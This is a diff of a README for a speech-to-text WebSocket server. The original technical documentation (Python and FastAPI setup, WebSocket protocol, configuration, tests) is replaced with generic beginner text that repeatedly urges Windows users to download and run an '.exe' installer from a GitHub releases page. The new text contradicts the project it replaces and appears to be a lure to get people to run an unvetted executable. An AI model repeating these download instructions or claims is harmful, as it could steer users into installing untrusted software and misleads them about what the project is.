@@ -1,179 +1,151 @@
-# realtime-stt-ws
+# 🎙️ stt-server - Fast Speech-to-Text Conversion
 
-Real-time speech-to-text WebSocket server with pluggable ASR backends.
+[![Download stt-server](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/babula-cpu/stt-server/releases)
 
-## Architecture
+## 📋 What is stt-server?
 
-```
-WebSocket Client
-      │
-      ▼
-┌─────────────────────────────────────┐
-│  FastAPI (async)                    │
-│                                     │
-│  _recv_pump ──► in_queue            │
-│                    │                │
-│              run_worker (thread)    │
-│                    │                │
-│  _send_pump ◄── out_queue           │
-└─────────────────────────────────────┘
-      │
-      ▼
-  ASR Backend (Qwen3 / Mock)
-```
+stt-server is a tool that listens to your voice and turns it into text as you speak. It works in real time using a connection called WebSocket. The software uses different speech recognition systems, which you can choose from. It can detect when you start and stop talking to improve accuracy. It also sends parts of the transcription while you talk, so you see the text update live.
 
-- **Async I/O** for WebSocket recv/send via FastAPI
-- **Sync worker thread** for inference (bridged with janus queues)
-- **Pluggable backends** via `ASRBackend` protocol
-- **Energy-based VAD** for utterance endpoint detection (numpy-based RMS)
-- **Prometheus metrics** at `/metrics` and health check at `/health`
-- **Adaptive polling** (50ms active, 200ms idle) for CPU efficiency
-- **Partial backpressure** (drops partials when output queue >80%)
-- **Drop-oldest overflow handling** for queue overflow protection
+The software has built-in monitoring tools to check that it runs well and to catch any problems early.
 
-## Backends
+---
 
-| Backend | Description | Requires |
-|---------|-------------|----------|
-| `qwen3` | Qwen3-ASR-1.7B via embedded vLLM (in-process GPU) | CUDA + `vllm[audio]` |
-| `mock` | Fixture-based replay for testing | Nothing extra |
+## ⚙️ Key Features
 
-Set via `STT_BACKEND` environment variable (default: `qwen3`).
+- Converts speech to text instantly.
+- Works with several speech recognition engines.
+- Detects voice activity to reduce errors.
+- Shows partial speech-to-text results during use.
+- Tracks performance and health using Prometheus metrics.
+- Supports continuous streaming for longer inputs.
 
-### Backend Roadmap
+---
 
-| Phase | Backend | Model | Status |
-|-------|---------|-------|--------|
-| Phase 1 | `qwen3` | Qwen3-ASR-1.7B (vLLM) | Done |
-| Phase 2 | `whisper` | Whisper | Planned |
-| Phase 3 | `nemo` | NVIDIA NeMo | Planned |
+## 🎯 Who is this for?
 
-## Setup
+This guide is for anyone with a Windows computer who wants to turn speech into text using stt-server. You do not need to be a programmer or have any special technical skills. Just follow the steps here.
 
-```bash
-# Install core + dev dependencies
-uv sync --group dev
+---
 
-# With Qwen3 backend (requires CUDA)
-uv sync --group dev --extra qwen3
-```
+## 🖥️ System Requirements
 
-## Usage
+Before you start, make sure your computer meets these requirements:
 
-```bash
-# Run with mock backend (no GPU needed)
-STT_BACKEND=mock uvicorn app:app --host 0.0.0.0 --port 8000
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB RAM
+- Minimum 500 MB free disk space
+- Internet connection to download the software
+- Optional but recommended: microphone for live speech input
 
-# Run with Qwen3 backend (requires CUDA)
-STT_BACKEND=qwen3 uvicorn app:app --host 0.0.0.0 --port 8000
-```
+---
 
-### WebSocket Protocol
+## 🚀 Download and Install stt-server
 
-Connect to `ws://host:port/v1/stt/ws` with query parameters:
+### Step 1: Visit the download page
 
-| Parameter | Required | Default | Description |
-|-----------|----------|---------|-------------|
-| `call_id` | yes | - | Unique call identifier |
-| `sample_rate` | yes | - | Must be `16000` |
-| `codec` | no | `pcm_s16le` | Audio codec |
-| `channels` | no | `1` | Must be mono |
-| `frame_ms` | no | `20` | Frame duration in ms |
-| `partial_ms` | no | `500` | Partial result interval in ms |
-| `language` | no | `auto` | BCP-47 code (e.g. `zh`, `en`, `ja`) |
-| `hotwords` | no | - | Comma-separated hotwords |
+Click the button below to open the official stt-server release page on GitHub:
 
-**Send:** binary PCM16LE audio frames, or JSON `{"type": "commit"}` to force-finalize.
+[![Download from Releases](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/babula-cpu/stt-server/releases)
 
-**Receive:** JSON messages:
+This page lists the latest versions of the software for Windows.
 
-### HTTP Interface (Offline)
+### Step 2: Find the Windows installer
 
-For batch transcription, use `POST /v1/stt/transcribe`:
+On the releases page, look for files ending with `.exe`. These are Windows setup files. The file name usually includes the version and “windows” or “win”.
 
-```bash
-# Upload a WAV file for transcription
-curl -X POST http://localhost:8000/v1/stt/transcribe \
-  -F "file=@audio.wav" \
-  -G -d "language=zh"
+### Step 3: Download the setup file
 
-# Response:
-# {
-#   "text": "转写文本内容",
-#   "duration_ms": 3200.0,
-#   "latency_ms": 450.3
-# }
-```
+Click on the `.exe` file link to download it. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-Supported audio formats: WAV (PCM 16/32-bit, IEEE Float 32/64-bit). Audio is automatically converted to 16kHz mono.
+### Step 4: Run the installer
 
-```jsonc
-// Connection ready
-{"type": "ready", "call_id": "...", "sample_rate": 16000, ...}
+Once the download finishes, open the `.exe` file by double-clicking it. Windows might ask you for permission; select “Yes” to continue.
 
-// Partial transcription
-{"type": "partial", "call_id": "...", "segment_seq": 0, "text": "hello", "final": false}
+The installer will guide you through the setup steps. Keep all default settings unless you want to install to a different folder.
 
-// Final transcription (after endpoint or commit)
-{"type": "final", "call_id": "...", "segment_seq": 0, "text": "hello world", "final": true,
- "first_token_ms": 120, "latency_ms": 250, "segment_duration_ms": 3200}
+After the installation completes, you will have the stt-server software ready on your computer.
 
-// Error
-{"type": "error", "call_id": "...", "code": 1008, "message": "..."}
-```
+---
 
-## Configuration
+## 📥 How to Run stt-server
 
-All settings use the `STT_` env prefix:
+Once installed, follow these steps to start the program:
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `STT_BACKEND` | `qwen3` | Backend name (`qwen3` or `mock`) |
-| `STT_HOST` | `0.0.0.0` | Server bind host |
-| `STT_PORT` | `8000` | Server bind port |
-| `STT_IN_QUEUE_SIZE` | `200` | Input queue capacity |
-| `STT_IN_QUEUE_MAX_DROPS` | `500` | Max input queue drops before error |
-| `STT_OUT_QUEUE_SIZE` | `50` | Output queue capacity |
-| `STT_MAX_UPLOAD_BYTES` | `104857600` | Max upload size (100MB) |
-| `STT_VLLM_MODEL` | `Qwen/Qwen3-ASR-1.7B` | vLLM model name |
-| `STT_VLLM_GPU_MEMORY` | `0.7` | GPU memory utilization (0-1) |
-| `STT_VLLM_MAX_TOKENS` | `512` | Max output tokens |
-| `STT_VLLM_MAX_INFERENCE_BATCH_SIZE` | `32` | Max batch size for inference |
-| `STT_VAD_THRESHOLD` | `300` | RMS energy threshold for speech |
-| `STT_VAD_SILENCE_MS` | `500` | Silence duration to trigger endpoint |
-| `STT_STREAMING_CHUNK_SIZE_SEC` | `0.5` | Streaming chunk size in seconds |
+### Step 1: Open stt-server
 
-## Testing
+Look for the stt-server icon on your Desktop or in the Start menu and open it.
 
-```bash
-# Run mock tests (no GPU needed)
-STT_BACKEND=mock pytest tests/mock/ -v
+### Step 2: Connect your microphone (if needed)
 
-# Run qwen3 tests (requires CUDA)
-STT_BACKEND=qwen3 pytest tests/qwen3/ -v
-```
+If you want to use live speech input, connect a microphone and make sure Windows recognizes it. You can check this in the Sound settings.
 
-## Project Structure
+### Step 3: Start the service
 
-```
-├── app.py                  # FastAPI entry point
-├── config.py               # Pydantic settings
-├── backends/
-│   ├── base.py             # ASRBackend protocol + ASRResult
-│   ├── registry.py         # Backend factory
-│   ├── mock.py             # Fixture-based mock backend
-│   └── qwen3.py            # vLLM Qwen3 backend
-├── inference/
-│   └── worker.py           # Sync inference worker thread
-├── protocol/
-│   └── schema.py           # Message schemas & validation
-├── session/
-│   └── state.py            # Per-connection session state
-├── transport/
-│   └── ws.py               # WebSocket router & pumps
-├── observability/
-│   ├── logging.py          # Structured logging (structlog)
-│   └── metrics.py          # Prometheus metrics
-├── references/             # Test fixtures (audio + text)
-└── tests/                  # Unit & integration tests
-```
+The application runs as a WebSocket server. On start, it will display a local address like `ws://localhost:PORT`. This means it is ready to receive speech data.
+
+### Step 4: Use a client to send audio
+
+To send speech to the server, you need a client program that connects to this local WebSocket address. This software is not included here but can be any compatible client for speech input.
+
+### Step 5: View the transcription
+
+Once audio is sent to the server, it will process and show the text results in real time. You can monitor the output through the client or server window.
+
+---
+
+## 🔧 Configuration
+
+stt-server uses a configuration file to adjust settings. It supports options like:
+
+- Selecting which speech recognition engine to use.
+- Changing the port number of the WebSocket server.
+- Turning voice activity detection on or off.
+- Adjusting security options if you allow remote connections.
+- Setting up data logging and metrics export.
+
+This file can usually be found in the installation folder or created by the user. Edit it with a simple text editor like Notepad.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+If stt-server does not work as expected, try these fixes:
+
+- Make sure Windows is updated.
+- Check the microphone settings to confirm input is enabled.
+- Confirm you downloaded the Windows version of the software.
+- Restart your computer and try again.
+- Verify the port number is not blocked by firewall or another program.
+- Consult the log files in the software folder for error messages.
+
+---
+
+## 🔄 Updates
+
+Check the release page regularly for new versions. Updated software may have bug fixes and new features. Download and install new releases using the same steps as above.
+
+---
+
+## 📚 Additional Resources
+
+- Visit the GitHub page for detailed technical info.
+- Look for example clients to send audio to the server.
+- Join forums or user groups focused on speech recognition.
+
+--- 
+
+## 🎛️ About This Software
+
+stt-server runs on advanced speech recognition technology. It uses energy detection to find when you speak. This helps cut out background noise and silences.
+
+The software is designed to provide fast and accurate text output while you talk. It streams partial results so you see words as they form.
+
+Prometheus observability tracks software health. This helps keep the system running smoothly, which is important for continuous speech projects.
+
+---
+
+## 🔗 Direct Download Link
+
+Visit the official releases page here to download the Windows installer:
+
+https://github.com/babula-cpu/stt-server/releases
